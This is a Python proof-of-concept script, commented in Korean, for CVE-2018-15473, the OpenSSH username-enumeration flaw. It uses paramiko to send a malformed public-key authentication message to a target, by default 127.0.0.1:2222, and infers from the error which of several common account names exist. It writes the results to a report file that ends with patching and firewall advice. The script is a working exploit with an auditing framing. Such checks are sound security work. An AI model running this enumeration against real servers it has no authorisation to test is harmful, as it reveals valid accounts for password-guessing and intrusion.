import paramiko
import socket
import logging
import os

# 파일 저장 경로 설정
REPORT_FILE = "reports/ssh_enum_final_report.txt"

# 보고서 디렉토리가 없으면 생성
if not os.path.exists("reports"):
    os.makedirs("reports")

def log_and_print(message):
    """콘솔 출력과 파일 저장을 동시에 수행"""
    print(message)
    with open(REPORT_FILE, "a", encoding="utf-8") as f:
        f.write(message + "\n")

def run_ssh_user_enum(target_ip, port, username):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target_ip, int(port)))
    except Exception as e:
        return False

    logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)
    transport = paramiko.Transport(sock)
    try:
        transport.start_client()
    except:
        transport.close()
        return False

    try:
        transport.auth_publickey(username, paramiko.Message())
    except paramiko.ssh_exception.AuthenticationException:
        log_and_print(f"[🔥 탐지 성공] '{username}' 계정은 실제 서버에 존재합니다! (CVE-2018-15473)")
        transport.close()
        return True
    except Exception:
        log_and_print(f"[-] '{username}' 계정은 서버에 존재하지 않습니다.")
        transport.close()
        return False

if __name__ == "__main__":
    TARGET_IP = "127.0.0.1"
    TARGET_PORT = 2222
    USER_LIST = ["root", "admin", "test", "ubuntu", "user"]

    # 보고서 초기화 (새로 쓰기)
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(f"[+] CVE-2018-15473 PoC 검증 결과 ({TARGET_IP}:{TARGET_PORT})\n\n")

    log_and_print(f"==================================================")
    log_and_print(f" [ASM] CVE-2018-15473 사용자 열거 PoC 스캔 시작")
    log_and_print(f" 타겟: {TARGET_IP}:{TARGET_PORT}")
    log_and_print(f"==================================================\n")

    for user in USER_LIST:
        run_ssh_user_enum(TARGET_IP, TARGET_PORT, user)

    log_and_print(f"\n[+] 조치 가이드:")
    log_and_print(f"1. OpenSSH 서버를 8.0p1 이상으로 업데이트하십시오.")
    log_and_print(f"2. 방화벽을 통해 신뢰된 관리자 IP만 SSH 접근을 허용하십시오.")
    log_and_print(f"\n[+] 스캔 완료 -> 보고서 저장: {REPORT_FILE}")